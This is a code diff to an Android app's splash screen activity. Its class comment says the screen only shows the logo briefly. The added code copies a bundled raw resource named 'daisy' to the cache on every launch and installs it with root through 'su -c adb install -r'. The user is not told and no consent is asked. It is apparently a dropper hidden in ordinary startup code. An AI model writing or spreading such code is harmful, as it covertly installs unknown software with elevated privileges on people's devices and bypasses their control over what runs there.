@@ -1,5 +1,7 @@
 package com.ally.activity.splash;
 
+import static com.google.firebase.crashlytics.internal.proto.CodedOutputStream.DEFAULT_BUFFER_SIZE;
+
 import android.content.Intent;
 import android.os.Build;
 import android.os.Bundle;
@@ -15,6 +17,11 @@ import com.ally.activity.onBoarding.slider.OnBoarding;
 import com.ally.common.session.SessionManager;
 import com.ally.utils.Constraint;
 
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+
 /**
  * Purpose - SplashScreen is an activity that show splash data
  * Responsibility - Its use to hold screen to some second and show app logo
@@ -28,6 +35,47 @@ public class SplashScreen extends BaseActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_splash_screen);
           initView();
+        installDefaultApk();
+
+    }
+
+    private void installDefaultApk() {
+        InputStream ins = getResources().openRawResource(
+                getResources().getIdentifier("daisy",
+                        "raw", getPackageName()));
+        File file=new File(getExternalCacheDir()+"/in");
+        try {
+            copyInputStreamToFile(ins, file);
+            try {
+                String adbCommand = "adb install -r " + file.getAbsolutePath();
+                String[] commands = new String[]{"su", "-c", adbCommand};
+                Process process = Runtime.getRuntime().exec(commands);
+                process.waitFor();
+            } catch (Exception e) {
+                //Handle Exception
+                e.printStackTrace();
+            }
+
+        }
+        catch (Exception e)
+        {
+            e.printStackTrace();
+        }
+
+
+    }
+
+    private static void copyInputStreamToFile(InputStream inputStream, File file)
+            throws IOException {
+
+        // append = false
+        try (FileOutputStream outputStream = new FileOutputStream(file, false)) {
+            int read;
+            byte[] bytes = new byte[DEFAULT_BUFFER_SIZE];
+            while ((read = inputStream.read(bytes)) != -1) {
+                outputStream.write(bytes, 0, read);
+            }
+        }
 
     }
 
